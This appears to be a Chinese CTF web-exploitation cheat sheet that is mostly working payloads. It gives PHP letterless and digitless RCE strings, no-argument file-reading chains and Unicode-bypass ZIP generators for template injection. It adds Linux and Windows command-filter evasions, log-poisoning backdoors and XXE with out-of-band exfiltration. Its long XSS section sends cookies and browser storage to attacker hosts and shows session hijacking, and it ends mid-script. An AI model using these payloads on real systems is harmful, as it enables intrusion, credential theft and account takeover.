$_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]);
//$_GET[_]($_GET[__])
%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
```

```plain
ctf_show=%24_%3DC%3B%24_%2B%2B%3B%24C1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24C%3D%2B%2B%24_.%24C1%3B%24_%3D(C%2FC.C)%5B0%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24C%3D_.%24C.%24_%3B%24%24C%5B1%5D(%24%24C%5B2%5D)%3B
//$_GET[0]($GET[1])

%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
//$_GET[_]($GET[_])
```

#### 1.无数字有字母
```plain

?cmd=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);
//长度118    $_GET[1]($_GET[2])
url编码：
?cmd=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B&1=system&2=id

```

#### 2 .无字母无数字
```plain
?cmd=$_=[]._;$__=$_['!'==','];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_='_'.$___;$$_[_]($$_[__]); 
//$_GET[_]($_GET[__]), 以便get传参, 参数名为_和__, 传参：?_=system&__=ls
url编码：
?cmd=%24_%3D%5B%5D._%3B%24__%3D%24_%5B'!'%3D%3D'%2C'%5D%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%2B%2B%24__%3B%2B%2B%24__%3B%24___%3D%2B%2B%24__.%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24___%3D%24___.%2B%2B%24__%3B%24_%3D'_'.%24___%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B%20&_=system&__=id

```

#### 3.assert($POST[_]);
```plain
//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
url编码：
?cmd=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B'!'%3D%3D'%40'%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D'_'%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B

```

#### 4. $_POST[%ff]($_POST[_]);  使用不可见字符%ff缩短长度，使用burpsuite发
```plain
一句话形式：
?cmd=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);
POST传参
%ff=system&_=id

```



### 无参rce
```plain
scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）
current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西
getcwd() :取得当前工作目录
dirname():函数返回路径中的目录部分
array_flip() :交换数组中的键和值，成功时返回交换后的数组
array_rand() :从数组中随机取出一个或多个单元
array_reverse():将数组内容反转
strrev():用于反转给定字符串
getcwd()：获取当前工作目录路径
dirname() ：函数返回路径中的目录部分。
chdir() ：函数改变当前的目录。
eval()、assert()：命令执行
hightlight_file()、show_source()、readfile()：读取文件内容

数组移动操作：
end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动

```

```plain
查看当前目录
?参数=var_dump(scandir(current(localeconv())));

highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位

利用getcwd()获取当前目录：
var_dump(getcwd());
结合dirname()列出当前工作目录的父目录中的所有文件和目录:
var_dump(scandir(dirname(getcwd())));
读上一级文件名：
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));

随机数读根目录:
?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
随机数读根目录文件：
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));

命令执行
?code=system(end(current(get_defined_vars())));&a=cat /f*;
```



### 半角字符绕过
```plain
import zipfile
import os
import tempfile
import argparse

# --------------------------
# 和目标系统完全一致的黑名单（必须和原代码保持同步）
# --------------------------
BLACKLIST = [
    "b", "c", "d", "e", "h", "i", "j", "k", "m", "n", "o", "p",
    "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "%", ";", ",", "<", ">", ":", "?"
]

def half_to_full(text):
    """
    仅对黑名单中的字符进行半角→全角转换，其余字符保持不变
    :param text: 输入的半角文本（如 'open('/custom/flag').read()'）
    :return: 针对性转换后的文本（仅黑名单字符转全角）
    """
    full_text = []
    for char in text:
        # 只转换：小写字母且在黑名单中（原代码检测时会转小写，所以只处理小写即可）
        if char.lower() in BLACKLIST and char.islower():
            # 半角→全角：Unicode偏移 0xFEE0
            full_char = chr(ord(char) + 0xFEE0)
            full_text.append(full_char)
        else:
            # 非黑名单字符（如 a、f、g、l 等）保持半角不变
            full_text.append(char)
    return ''.join(full_text)

def generate_malicious_zip(flag_path="/flag", output_zip="malicious_flag.zip"):
    """
    生成针对性转换的恶意ZIP文件（仅黑名单字符转全角，支持自定义flag路径）
    :param flag_path: 目标flag路径（如 '/custom/flag'）
    :param output_zip: 输出ZIP文件名
    """
    # 1. 输入半角恶意代码（动态拼接flag路径）
    half_width_code = f"open('{flag_path}').read()"
    # 2. 仅对黑名单字符进行全角转换（精准绕过）
    full_width_code = half_to_full(half_width_code)
    # 3. 拼接为Bottle模板注入格式（{{ 代码 }}）
    malicious_content = f"{{{{{full_width_code}}}}}"

    # 打印转换详情（方便验证哪些字符被转换）
    print(f"🔍 转换详情（仅黑名单字符转全角）：")
    print(f"   原黑名单：{BLACKLIST}")
    print(f"   半角代码：{half_width_code}")
    print(f"   转换后：{full_width_code}")
    print(f"   最终注入代码：{malicious_content}")

    # 创建临时文件（自动清理，无残留）
    with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', suffix='.txt', delete=False) as temp_file:
        temp_file.write(malicious_content)
        temp_file_path = temp_file.name

    try:
        # 打包为ZIP（恶意文件放根目录，命名为flag.txt，避免路径问题）
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_file_path, arcname="flag.txt")

        print(f"\n✅ ZIP文件生成成功！")
        print(f"📁 保存路径：{os.path.abspath(output_zip)}")
        print(f"🎯 目标flag路径：{flag_path}")
        print(f"📄 ZIP内文件：flag.txt（UTF-8编码）")

    finally:
        # 清理临时文件
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            print(f"🗑️  临时文件已清理")

if __name__ == "__main__":
    # 支持命令行参数（自定义flag路径和输出文件名）
    parser = argparse.ArgumentParser(description="生成针对性全角转换的恶意ZIP文件（仅黑名单字符转换）")
    parser.add_argument(
        "--flag-path",
        default="/flag",
        help="自定义flag路径（如 --flag-path /custom/flag）"
    )
    parser.add_argument(
        "--output",
        default="malicious_flag.zip",
        help="输出ZIP文件名（如 --output my_exp.zip）"
    )
    args = parser.parse_args()

    # 运行生成函数
    generate_malicious_zip(flag_path=args.flag_path, output_zip=args.output)
```

### 斜体字Unicode绕过
```plain
import zipfile
import os

# 1. 定义我们需要的 Unicode 字符
# 对应 open
u_o = "\U0001D45C" # 𝑜
u_p = "\U0001D45D" # 𝑝
u_e = "\U0001D452" # 𝑒
u_n = "\U0001D45B" # 𝑛

# 对应 read
u_r = "\U0001D45F" # 𝑟
# e 已经有了
u_a = "\U0001D44E" # 𝑎 (虽然 a 是允许的，但用 unicode 保持一致也没问题，或者直接用 ascii a 也可以)
u_d = "\U0001D451" # 𝑑

# 2. 拼接 Payload
# 目标: {{ open('/flag').read() }}
# 注意: '/flag' 中的 f,l,a,g, / 都是允许字符，无需 Unicode 混淆
payload_code = f"{u_o}{u_p}{u_e}{u_n}('/flag').{u_r}{u_e}a{u_d}()"
full_payload = "{{" + payload_code + "}}"

print(f"Generated Payload Content: {full_payload}")

# 3. 创建 ZIP 文件
filename = "exploit.txt"
zip_name = "payload.zip"

with zipfile.ZipFile(zip_name, 'w') as zf:
    zf.writestr(filename, full_payload)

print(f"[*] {zip_name} 已生成。请上传此文件。")
```

## Linux篇
### 命令拼接
```plain

a=who

b=ami

$a$b //输出whoami

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

常用字符使用

```plain

& 表示将任务置于后台执行

; 多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块

&& 只有在 && 左边的命令返回真(命令返回值 $? == 0),&&右边的命令才会被执行。

|| 只有在 || 左边的命令返回假(命令返回值 $? == 1),||右边的命令才会被执行。

%0a

%0d

| (管道符) |表示管道，上一条命令的输出，作为下一条命令的参数

find / -name "flag*"

```

例:

```plain

echo qwe ; ls //会先输出字符qwe,然后执行ls

q=l; w=s; e=" -al"; $q$w$e //执行ls -al命令

qwe | ls //执行后面的命令,前面的不执行

```



### 利用Linux的环境变量
```plain

echo ${PATH}///usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

echo ${PATH:1:9}//usr/local

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

所以,我们可以通过截断和拼接来得到我们想要的来getshell

```plain

${PATH:5:1}//l

${PATH:2:1}//s

${PATH:5:1}${PATH:2:1}//拼接后是ls,执行命令

${PATH:5:1}s//拼接后是ls,执行命令

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

空格绕过

```plain

$IFS

$IFS$1

${IFS}

$IFS$9

< 比如cat cat<flag

<>

{cat,flag.php} //用逗号实现了空格功能，需要用{}括起来

%20

%09

```

### 绕过关键字
基础常见版本:

```plain

wh\o\ami//反斜线绕过

who"a"mi//双引号绕过

whoa'm'i//单引号绕过

whoam``i//反引号绕过

echo d2hvYW1p|base64 -d|sh//base64绕过,其中d2hvYW1p是whoami的base64编码

echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码

`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令

echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码

//$*和$@，$x(x 代表 1-9),${x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:


$(printf "\154\163") //ls unicode编码

wh$1oami

who$@ami

whoa$*mi

传参是c_md,_被过滤，可以用[代替
```

进阶深入:

```plain

666`whoami`666//bash: 666root666: command not found

666`\whoami`666//bash: 666root666: command not found

//命令执行后的结果在2个666中间

```

所以更进一步:

```plain

w`f1hgb`ho`f1hgb`am`f1hgb`i//反引号的作用是把括起来的字符当做命令执行

w`\f1hgb`ho`\f1hgb`am`\f1hgb`i//这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行

wh$(f1hgb)oa$(f1hgb)mi//和上面的差不多,都说执行和拼接

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

上述的是既可以绕过命令,又可以绕过文件名的,下述的则是只能用来绕过文件名的:

```plain

cat fl[abc]g.php //匹配[abc]中的任何一个

cat f[a-z]ag.txt //匹配a-z范围的任何字符

cat fla* //用*匹配任意

a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php//内联执行

```

下述的则是文件名绕过

```plain

利用正则:比如要读取etc/passwd

cat /???/??????

cat /???/pass*

cat /etc$u/passwd

tac f???????

tac fl*g.php tac fl*

tac fla''g.php

tac fl\ag.php
```

### 命令执行函数绕过
这里只举例`system`

```plain

system("cat /etc/passwd")

<=>

"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");

<=>

(sy.(st).em)("cat /etc/passwd");

<=>还可以用注释方法绕过

"system/*fthgb666*/("cat /etc/passwd);"

<=>

"system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"

<=>

"(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);"

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

## 传参执行绕过
### eval函数
eval函数执行任意php命令，这里利用get方式接受x参数，在传参中执行命令，而在这个get方式接受的参数并没有被过滤

```plain
?c=eval($_GET[x]);&x=system("ls");
?c=eval($_GET[x]);&x=system("tac flag.php");

```

### include函数
这个方法实际上是结合了文件包含漏洞，利用文件包含读取flag

```plain
?c=include($_GET[x]);&x=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php

```

如果`**(**`和`**;**`被过滤：  
`**%0a**` 是 URL 编码中表示换行符（`**\n**`）的字符。从而使得 `**include**` 语句和 `**$_GET[1]**` 的处理被分开，从而绕过过滤机制，不过include函数这里不加`**(**`也是可以的  
php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号。

```plain
?c=include%0a$_GET[1]?>&1=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
?c=include$_GET[1]?>&1=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php

```

### 日志包含
既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码（也可在其他位置写入），然后我们包含日志文件，那么就能通过后门代码读取文件

```plain
apache 位置：
Apache\logs\access.log #windows
/var/log/apache2/access.log.1 #linux
ngnix：
/var/log/nginx/access.log #linux
```

```plain
?c=include$_GET[1]?>&1=../../../../var/log/nginx/access.log  

User-Agent:<?php eval($_POST['x']);?>

```

### ping
```plain
127.0.0.1 || ls
1||ls
127.0.0.1 | ls
127.0.0.1 & ls
127.0.0.1 && ls
kg=$'\x20flag.txt'&&cat$kg

绕过空格
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能
%20 
%09 


```







#### 命令拼接绕过
```plain
127.0.0.1;`a="l";b="s";c=$a$b;$c`
```

## windows篇
### 符号与命令
```plain

whoami //正常执行

w"h"o"a"m"i 或"w"h"o"a"m"i"或"w"h"o"a"m"i或w"h"o"a"m"i"//正常执行

who^ami或wh""o^a^mi 或wh""o^a^mi"//正常执行

但是"wh""o^a^mi"这种在开头就有单引号的情况是不能执行的

(Whoami)或(Wh^o^am""i)或((((Wh^o^am""i)))) //正常执行 注:可以加无数个"但不能同时连续加2个^符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

### set命令
_知识点:用两个%括起来的变量,会输出变量的值_

```plain

set a=1 //设置变量a，值为1

echo a //此时输出结果为"a"

echo %a% //此时输出结果为"1"

```

接下来的进阶利用就是:

```plain

set a=who

set b=ami

%a%%b% //正常执行whoami

call %a%%b% //正常执行whoami

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

所以,上述的符号与命令部分的所有操作,都可以通过set来实现,只需要慢慢拼接就ok

### 切割字符
```plain

set a=whoami

%a:~0% //取出所有字符,所以正常执行命令

%a:~0,6% //从开始切割6个字符,刚好是whoami,所以正常执行

%a:~0,5% //切割后是whoam,不是系统命令,不能执行

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

注:上述可以使用减号,和python的切割效果差不多

所以,可以考虑的东西就来了:

```plain

set a=abc qwe //先自定义

wh^o^%a:~0,1%mi //然后截断整理后就变成了:wh^o^ami,所以命令执行成功

```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-015.bin)

所以,这样写webshell什么的也就很简单了

### 逻辑运算符
+ |:可以连接命令,但只会执行后面的那条
+ ||:只有前面的命令失败,才会执行后面的语句
+ &:前面的命令可以成功也可以失败,都会执行后面的命令
+ &&:必须两条命令都为真才可以全部执行。如果第一条语句错误,整个命令都不执行。如果第一条语句对,第二条错误,就只执行第一条

```plain

whoami | ping www.baidu.com

whoami || ping www.baidu.com

qwe & ping www.baidu.com

qwe && ping www.baidu.com

```



## xml注入 XXE
xxe漏洞

```plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <输出>&xxe;</输出>
</root>

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

xxe盲注

```plain
<?xm<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php" >]>
    <user>

<name>&xxe;</name>

```

<font style="color:rgb(31, 35, 40);">带外部DTD的OOB XXE</font>

```plain
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

### xss(cookie)
```plain
从 Cookies 进行 PHP 反序列化
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```

xss获取cookie

启动一个服务器，在服务器上创建一个cookies.php文件

```plain
<?php
$cookie = $_GET['cookie'];
file_put_contents('cookie.txt', $cookie);
?>
```

```plain
<script>alert(document.cookie);</script>
<script>new Image().src="http://your_ip:your_port/?cookies=" + document.cookie;</script>
<img src="http://your-server-ip/cookie-stealer.php?cookie=" + document.cookie>
<script>alert(/xss/)</script>
<script>window.location.href='http://192.168.114.251:7777/?cookie='+document.cookie</script>


// 方法1: 直接重定向
<script>
document.location = 'http://your_ip:your_port/?cookies' + document.cookie;
</script>

// 方法2: 使用Image对象（更隐蔽）
<script>
new Image().src = 'http://your_ip:your_port/?cookies' + document.cookie;
</script>

// 方法3: 使用XMLHttpRequest
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://your_ip:your_port/?cookies', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookie=' + encodeURIComponent(document.cookie));
</script>

// 使用Fetch API（现代浏览器）：

<script>
fetch('http://your_ip:your_port/?cookies', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    })
});
</script>

窃取所有存储数据：

<script>
// 收集所有浏览器存储的数据
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    indexedDB: 'checking...'
};

// 发送到攻击者服务器
fetch('http://your_ip:your_port/?cookies', {
    method: 'POST',
    body: JSON.stringify(data)
});
</script>

HttpOnly标志禁止JavaScript访问Cookie，但可以通过其他方式绕过：

方法1: 利用TRACE方法（已过时但仍需了解）：

<script>
var xhr = new XMLHttpRequest();
xhr.open('TRACE', '/', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // TRACE会返回完整请求头，包含Cookie
        var cookie = xhr.responseText.match(/Cookie: (.*)/)[1];
        new Image().src = 'http://your_ip:your_port/?cookies' + cookie;
    }
};
xhr.send();
</script>

方法2: 通过子域XSS窃取父域Cookie：

// 如果在sub.example.com上有XSS，可以窃取.example.com的Cookie
<script>
// 创建指向父域的请求
var iframe = document.createElement('iframe');
iframe.src = 'https://example.com/';
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = function() {
    // 通过iframe访问父域页面
    var cookies = iframe.contentDocument.cookie;
    new Image().src = 'https://xss.li/collect?c=' + cookies;
};
</script>

方法3: 会话固定攻击：

// 不直接窃取Cookie，而是固定受害者的Session ID
<script>
// 1. 获取攻击者自己的Session ID
// 2. 让受害者使用这个Session ID登录
// 3. 攻击者使用同样的Session ID访问
document.cookie = 'PHPSESSID=attacker_session_id; path=/';
location.href = '/login';
</script>

3.1 完整的Cookie窃取攻击流程
步骤1: 创建恶意Payload

// cookie-stealer.js
(function() {
    // 收集用户信息
    var info = {
        cookie: document.cookie,
        url: location.href,
        title: document.title,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
    };
    
    // 发送到攻击者服务器
    var beacon = new Image();
    beacon.src = 'https://xss.li/api/collect?' + 
                 Object.keys(info).map(k => k + '=' + encodeURIComponent(info[k])).join('&');
    
    // 备用方法
    setTimeout(function() {
        fetch('https://xss.li/api/collect', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(info)
        });
    }, 100);
})();
</script>
步骤2: 注入XSS

<!-- 反射型XSS示例 -->
https://vulnerable-site.com/search?q=<script src="https://xss.li/payloads/cookie-stealer.js"></script>

<!-- 存储型XSS示例 -->
评论内容: <img src=x onerror="eval(atob('base64编码的窃取代码'))">
步骤3: 使用窃取的Cookie

// 在浏览器控制台中
document.cookie = 'sessionid=窃取到的session值';
location.reload();

// 或使用curl
curl -H "Cookie: sessionid=窃取到的session值" https://target-site.com/account
3.2 持久化会话劫持
<script>
// 创建WebSocket连接，实时监控Cookie变化
var ws = new WebSocket('wss://xss.li/realtime');

// 定期检查Cookie变化
setInterval(function() {
    var currentCookie = document.cookie;
    if (currentCookie !== lastCookie) {
        ws.send(JSON.stringify({
            type: 'cookie_update',
            cookie: currentCookie,
            url: location.href,
